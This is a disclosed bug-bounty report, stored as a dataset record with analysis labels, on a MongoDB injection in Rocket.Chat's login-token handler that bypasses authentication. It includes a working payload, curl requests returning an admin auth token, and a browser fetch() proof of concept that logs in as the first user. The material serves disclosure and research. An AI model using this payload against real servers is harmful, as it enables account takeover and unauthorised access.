{
  "reported_to": "Rocket.Chat",
  "reported_by": "gronke ",
  "title": "Authentication Bypass in login-token Authentication Method",
  "content": "\nSummary\nImproper input data validation in the login-token authentication method leads to an authentication bypass.\nDescription\nData from HTTP POST requests is forwarded to hardcoded Login Handlers, including the login-token method defined in app/token-login/server/login_token_server.js#L10.\nCode 340 Bytes\n1Accounts.registerLoginHandler('login-token', function (result) {\n2\tif (!result.loginToken) {\n3\t\treturn;\n4\t}\n5\n6\tconst user = Meteor.users.findOne({\n7\t\t'services.loginToken.token': result.loginToken,\n8\t});\n9\n10\tif (user) {\n11\t\tMeteor.users.update({ _id: user._id }, { $unset: { 'services.loginToken': 1 } });\n12\n13\t\treturn {\n14\t\t\tuserId: user._id,\n15\t\t};\n16\t}\n17});\nThe result.loginToken parameter is taken from the HTTP POST requests JSON body of the /api/v1/login route, so that Mongo DB injection returns a valid authToken for the first matching user.\nCode 387 Bytes\n1$ curl -s 'http://127.0.0.1:3000/api/login' -H \"Content-Type: application/json\" -d '{\"loginToken\": { \"$exists\": false }}' | head\n2{\n3  \"status\": \"success\",\n4  \"data\": {\n5    \"userId\": \"rocket.cat\",\n6    \"authToken\": \"MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB\",\n7    \"me\": {\n8      \"_id\": \"rocket.cat\",\n9      \"avatarOrigin\": \"local\",\n10      \"name\": \"Rocket.Cat\",\n11      \"username\": \"rocket.cat\",\nTypically the first user in a Rocket.Chat MongoDB database is rocket.cat, which is a privileged account. This can be confirmed by using the returned secret in an API call to /api/v1/me:\nCode 1.83 KiB\n1$ curl -H \"x-user-id: rocket.cat\" -H \"x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB\" http://127.0.0.1:3000/api/v1/me              \n2{                                                                                                                                                                        \n3  \"_id\": \"rocket.cat\",                                                                                                                                                   \n4  \"avatarOrigin\": \"local\",                                                                                                                                               \n5  \"name\": \"Rocket.Cat\",                                                                                                                                                  \n6  \"username\": \"rocket.cat\",                                                                                                                                              \n7  \"status\": \"away\",                                                                                                                                                      \n8  \"statusDefault\": \"online\",                                                                                                                                             \n9  \"utcOffset\": 1,                                                                                                                                                        \n10  \"active\": true,                                                                                                                                                        \n11  \"_updatedAt\": \"2022-01-12T01:45:57.208Z\",                                                                                                                              \n12  \"roles\": [\n13    \"bot\"\n14  ],\nWhen loginToken is legitimately used an attacker would need to switch the strategy from using $empty to $regex instead.\nReleases Affected:\n4.3.1\n3.18.3\ndevelop\nSteps To Reproduce (from initial installation to vulnerability):\nOpen Rocket.Chat (logged out)\nOpen Web Inspector\nRun PoC Request\nSupporting Material/References:\nProof of Concept\nCode 416 Bytes\n1fetch(\"/api/v1/login\", {\n2  method: \"POST\",\n3  body: '{\"loginToken\": { \"$exists\": false }}',\n4  headers: {\n5    \"Content-Type\": \"application/json\"\n6  }\n7})\n8.then(res => res.json())\n9.then(({ data: { userId, authToken }}) => {\n10  console.log(`login as ${userId}`)\n11  Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);\n12  Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);\n13  window.location.reload()\n14});\nSuggested mitigation\nValidate result.loginToken input data in loginToken auth handler.\nImpact\nUnauthenticated clients can bypass the login and obtain administrative access to the Rocket.Chat instance.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Authentication - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1723341420,
  "report_url": "https://hackerone.com/reports/1447619",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to /api/v1/login with a JSON body containing a MongoDB query operator like {\"loginToken\": { \"$exists\": false }}"
    ],
    [
      2,
      "Extract the returned authToken and use it to authenticate as the first user in the database (typically rocket.cat)"
    ]
  ],
  "vuln_description": "Improper input validation in the login-token authentication method allows unauthenticated users to bypass authentication by injecting MongoDB query operators, granting access to privileged accounts.",
  "reason": "The vulnerability involves a straightforward MongoDB injection with no complex application state manipulation or novel logic. The attack vector is clear once the login handler's lack of input validation is identified.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": true
  }
}